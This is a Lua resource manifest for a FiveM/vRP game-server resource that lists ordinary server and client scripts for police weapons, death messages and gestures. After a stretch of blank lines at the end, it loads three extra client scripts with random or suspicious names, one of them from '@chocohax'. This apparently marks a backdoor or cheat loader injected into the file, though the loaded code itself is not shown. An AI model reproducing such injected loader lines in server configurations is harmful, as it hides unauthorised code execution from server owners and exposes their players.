-- server scripts
server_scripts{ 
  "@vrp/lib/utils.lua",
  "deletepoliceweapons-server.lua",
  "deathmessages-server.lua",
  "fixdv-server.lua",
  --"me-server.lua",
  "commands-server.lua",
  "suptime.lua"
}

-- client scripts
client_scripts{
  "pointfinger-client.lua",
  "fixdv-client.lua",
  "handsup-client.lua",
  "deletepoliceweapons-client.lua",
  "deathmessages-client.lua",
  "numeserver.lua",
  "basic.lua"
 }
 
  exports {
    'getSurrenderStatus',
}
client_script "dXKYKWpRFBlOIBufyi.lua"







client_script "13277.lua"
client_script '@chocohax/10992.lua'